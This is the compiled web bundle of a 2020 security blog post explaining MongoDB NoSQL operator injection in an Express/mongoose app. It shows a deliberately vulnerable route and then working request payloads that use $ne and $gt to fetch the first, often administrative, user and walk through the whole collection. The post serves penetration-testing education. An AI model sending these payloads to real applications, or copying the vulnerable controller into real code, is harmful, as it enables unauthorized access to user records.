(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[3672],{70570:function(e,s,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection",function(){return n(82064)}])},82064:function(e,s,n){"use strict";n.r(s),n.d(s,{__toc:function(){return a}});var t=n(35250),r=n(47147),i=n(77298),o=n(18363),l=n(13423);let a=[{depth:2,value:"Exploit",id:"exploit"},{depth:2,value:"Caveats",id:"caveats"}];function _createMdxContent(e){let s=Object.assign({h1:"h1",a:"a",p:"p",pre:"pre",code:"code",span:"span",table:"table",thead:"thead",tr:"tr",th:"th",tbody:"tbody",td:"td",h2:"h2",em:"em",hr:"hr"},(0,i.a)(),e.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.h1,{children:"MongoDB NoSQL Operator Injection: Iterating Collections"}),"\n",(0,t.jsxs)("p",{className:"text-xs text-right",children:["July 25, 2020 by ",(0,t.jsx)(s.a,{href:"/about#patrickd",children:"patrickd"})]}),"\n",(0,t.jsx)(s.p,{children:"During Penetration-Test reconnaissance, enumerating through rows of a SQL database is usually simple due to the use of sequential identifiers:"}),"\n",(0,t.jsx)(s.pre,{"data-language":"bash","data-theme":"default",children:(0,t.jsxs)(s.code,{"data-language":"bash","data-theme":"default",children:[(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"1"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"2"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"3"})]}),"\n",(0,t.jsx)(s.span,{className:"line",children:(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"..."})})]})}),"\n",(0,t.jsxs)(s.p,{children:["The NoSQL database ",(0,t.jsx)(s.a,{href:"https://www.mongodb.com/",children:"MongoDB"})," uses ",(0,t.jsx)(s.a,{href:"https://docs.mongodb.com/manual/reference/method/ObjectId/",children:'"ObjectIds"'})," which are 12 byte (represented as a 24 characters long hexdecimal string) identifiers made up of:"]}),"\n",(0,t.jsxs)(s.table,{children:[(0,t.jsx)(s.thead,{children:(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.th,{align:"right",children:"Length"}),(0,t.jsx)(s.th,{align:"left",children:"Description"})]})}),(0,t.jsxs)(s.tbody,{children:[(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.td,{align:"right",children:"4 bytes"}),(0,t.jsx)(s.td,{align:"left",children:"unix timestamp"})]}),(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.td,{align:"right",children:"5 bytes"}),(0,t.jsx)(s.td,{align:"left",children:'"random" value, typically a 3 byte machine specific identifier (eg. from mac address) and the 2 byte process id'})]}),(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.td,{align:"right",children:"3 bytes"}),(0,t.jsx)(s.td,{align:"left",children:"sequential counter (does not reliably count in increments of 1)"})]})]})]}),"\n",(0,t.jsx)(s.p,{children:'Although this means that ObjectIds can be called "incremental" (as each new id is greater than the previous one), they are still more difficult to predict than a simple integer.'}),"\n",(0,t.jsx)(s.h2,{id:"exploit",children:"Exploit"}),"\n",(0,t.jsxs)(s.p,{children:["Let's assume we have a NodeJS application with a route controller executing a read operation (using the ",(0,t.jsx)(s.a,{href:"https://mongoosejs.com/",children:"mongoose ODM"})," library) in order to fetch a single document from a collection with a specified identifier:"]}),"\n",(0,t.jsx)(s.pre,{"data-language":"javascript","data-theme":"default",filename:"Route Controller",children:(0,t.jsxs)(s.code,{"data-line-numbers":"","data-language":"javascript","data-theme":"default","data-line-numbers-max-digits":"1",children:[(0,t.jsx)(s.span,{className:"line",children:(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-comment)"},children:"// GET /users?id=5ef3bfd5bec2121c8525f3fe"})}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"app"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".get"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'/users'"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"async"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" (req) "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"=>"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-comment)"},children:"// -> db.users.findOne({ _id: ObjectId('5ef3bfd5bec2121c8525f3fe') })"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"return"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"userModel"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".findOne"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"({ _id"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsxs)(s.span,{"data-rehype-pretty-code-wrapper":!0,className:"highlighted",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"req"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"."}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"query"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:".id"})]}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" });"})]}),"\n",(0,t.jsx)(s.span,{className:"line",children:(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"});"})})]})}),"\n",(0,t.jsxs)(s.p,{children:["The used ",(0,t.jsx)(s.a,{href:"https://expressjs.com/",children:"expressJS"})," HTTP application server framework (and many others) will parse the query parameters while allowing arrays (",(0,t.jsx)(s.span,{"data-rehype-pretty-code-fragment":"",children:(0,t.jsx)(s.code,{"data-language":"js","data-theme":"default",children:(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"?"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"key[]"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"value1"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"&"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"key[]"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"value2"})]})})}),") and even objects (",(0,t.jsx)(s.span,{"data-rehype-pretty-code-fragment":"",children:(0,t.jsx)(s.code,{"data-language":"js","data-theme":"default",children:(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"?"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"key[field]"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"value"})]})})}),") to be specified."]}),"\n",(0,t.jsxs)(s.p,{children:["This can be used to inject query operators such as not-equal (",(0,t.jsx)(s.code,{children:"$ne"}),"):"]}),"\n",(0,t.jsx)(s.pre,{"data-language":"bash","data-theme":"default",children:(0,t.jsx)(s.code,{"data-language":"bash","data-theme":"default",children:(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id["}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"$ne"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"]="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"000000000000000000000000"})]})})}),"\n",(0,t.jsxs)(s.p,{children:["Resulting query: Find one document with an ID that is ",(0,t.jsx)(s.em,{children:"not equal"})," to the specified ID."]}),"\n",(0,t.jsx)(s.pre,{"data-language":"javascript","data-theme":"default",children:(0,t.jsx)(s.code,{"data-language":"javascript","data-theme":"default",children:(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"db"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"."}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"users"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".findOne"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"({ _id"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" { $ne"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"ObjectId"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'000000000000000000000000'"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:") } })"})]})})}),"\n",(0,t.jsx)(s.p,{children:"This yields us the very first document of the users collection (the first document that does not match the specified identifier in the natural order of the collection), which is typically an administrative user."}),"\n",(0,t.jsxs)(s.p,{children:["After having determined the identifier of the first document in the collection, we can use the greater-than (",(0,t.jsx)(s.code,{children:"$gt"}),") operator to iterate over the whole collection:"]}),"\n",(0,t.jsx)(s.pre,{"data-language":"bash","data-theme":"default",children:(0,t.jsxs)(s.code,{"data-language":"bash","data-theme":"default",children:[(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id["}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"$ne"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"]="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"000000000000000000000000"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"->"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"1"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"."}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"document:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"_id:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"5"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"f1caba000aa76a6263c1854"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id["}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"$gt"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"]="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"5"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"f1caba000aa76a6263c1854"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"->"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"2"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"."}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"document:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"_id:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"5"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"f1caba300aa76a6263c1857"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"GET"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"/users?id["}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"$gt"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"]="}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"5"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"f1caba300aa76a6263c1857"})]}),"\n",(0,t.jsxs)(s.span,{className:"line",children:[(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"->"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"3"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"."}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"document:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"_id:"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"5"}),(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-string)"},children:"f1cabae00aa76a6263c185f"})]}),"\n",(0,t.jsx)(s.span,{className:"line",children:(0,t.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"..."})})]})}),"\n",(0,t.jsx)(s.h2,{id:"caveats",children:"Caveats"}),"\n",(0,t.jsxs)(s.p,{children:["Note that vectors involving MongoDB ObjectIds are only available when ODMs such as mongoose are used that will automatically convert strings into them. When ",(0,t.jsx)(s.a,{href:"https://mongodb.github.io/node-mongodb-native/",children:"native clients"})," are used, query values will usually be passed through a conversion function causing errors to be thrown when attempting to exploit this flaw: ",(0,t.jsx)(s.code,{children:"Provided identifier is not a valid MongoDB ObjectId string: '[object Object]'"}),"."]}),"\n",(0,t.jsxs)(s.p,{children:["Another problem is that the ID must be part of the query parameters. If REST-like patterns are used and the identifier is part of the path (",(0,t.jsx)(s.code,{children:"/users/5ef3bfd5bec2121c8525f3fe"}),") we won't be able to inject operators so easily."]}),"\n",(0,t.jsx)(s.hr,{}),"\n","\n",(0,t.jsx)(o.oy,{children:(0,t.jsx)(o.Zb,{icon:(0,t.jsx)(l.H8,{}),title:"MongoDB NoSQL Operator Injection: Cracking Sessions →",href:"/posts/2020/8/9/cracking-sessions-mongodb-nosql-operator-injection/"})})]})}s.default=(0,r.j)({MDXContent:function(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},{wrapper:s}=Object.assign({},(0,i.a)(),e.components);return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(_createMdxContent,{...e})}):_createMdxContent(e)},pageOpts:{filePath:"pages/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection.mdx",route:"/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection",timestamp:1701473445e3,title:"MongoDB NoSQL Operator Injection: Iterating Collections",headings:a},pageNextRoute:"/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection"})}},function(e){e.O(0,[3220,1589,9774,2888,179],function(){return e(e.s=70570)}),_N_E=e.O()}]);